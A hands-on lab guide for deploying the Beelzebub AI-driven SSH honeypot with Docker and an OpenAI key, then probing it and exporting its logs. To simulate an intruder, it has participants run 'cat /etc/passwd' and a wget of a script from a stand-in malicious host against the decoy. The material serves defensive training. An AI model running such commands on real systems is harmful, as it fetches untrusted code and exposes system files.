Beelzebub is an advanced honeypot framework designed to provide a highly secure environment for detecting and analyzing cyber attacks. It offers a low code approach for easy implementation and uses AI to mimic the behavior of a high-interaction honeypot

# Setup
Participants will deploy and monitor an AI-powered SSH honeypot (Beelzebub) to detect and analyze attacker behavior in real time

```bash
sudo su -
```
```bash
apt update && apt upgrade -y
```
```bash
systemctl enable --now docker
```
```bash
cd /opt
```
```bash
git clone https://github.com/mariocandela/beelzebub.git
```

### Get the ChatGPT Api Key
- Go to [ChatGPT](https://chatgpt.com/) and create an account if you donâ€™t have one
- Make sure you have credits or a payment method at [Billing Setting](https://platform.openai.com/settings/organization/billing/overview)
- Go to [API Keys](https://platform.openai.com/api-keys) and create a new key
- Save this key as you will only see it once!

### Deployment
- Make sure you are into **/opt/beelzebub/**

```bash
nano docker-compose.yml
```
 - Put your key here

- Also comment the **Default SSH Mapping**(ssh 22 port)

```bash
cd configurations/services/
```
```bash
mv ./ssh-22.yaml ~
```
```bash
nano ./ssh-2222.yaml
```
 - Add your key with double quotes around it like `OPENAI_API_KEY: "your_api_key_here"`
```bash
cd /opt/beelzebub/
```
```bash
docker-compose build
```
```bash
docker-compose up -d
```

# Try it
Connect to it like this:

```bash
ssh -p 2222 root@127.0.0.1
``` 
- use password "**1234**"
- Try using any commands like **ls** or **id**

Everything you see is AI generated, and that's what an attacker would see

Cool, right?

- Try running suspicious commands an attacker would use
```bash
uname -a
```
```bash
cat /etc/passwd
```
```bash
wget http://malicious.example/malware.sh
```
```bash
id
```
Now exit the session to export the logs

```bash
cd /opt/beelzebub/
```
```bash
docker-compose logs -f
```
```bash
docker-compose logs > honeypot.log
```

Take your time into analyzing the logs and seeing how they are being built
